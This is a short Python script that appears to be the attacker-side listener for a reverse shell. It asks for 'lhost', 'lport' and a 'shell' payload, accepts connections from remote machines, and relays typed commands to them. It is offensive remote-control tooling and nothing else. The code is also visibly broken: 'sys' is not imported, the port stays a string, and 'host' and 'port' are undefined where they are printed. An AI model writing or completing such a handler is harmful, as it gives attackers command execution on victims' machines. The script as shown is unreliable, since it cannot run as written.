import socket
import threading
import os


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            server.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

def create():
    global server
    
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
def bind():
    host=input("lhost>")
    port=input("lport>")
    
    server.bind((host,port))
def listen():
    server.listen(5)
    print ("[*] listening on {}:{}".format(host,port))

def accept():
    while True:
        conn,addr = server.accept()
        print('accepted connection from {} and port {}'.format(addr[0],addr[1]))
        print("enter the commands below")
        send_commands(conn)
        conn.close()
def main():
    x=input("enter the payload")
    if x=='shell':
        create()
        bind()
        listen()
        accept()
    else:
        print("wrong input")
        main()

main()
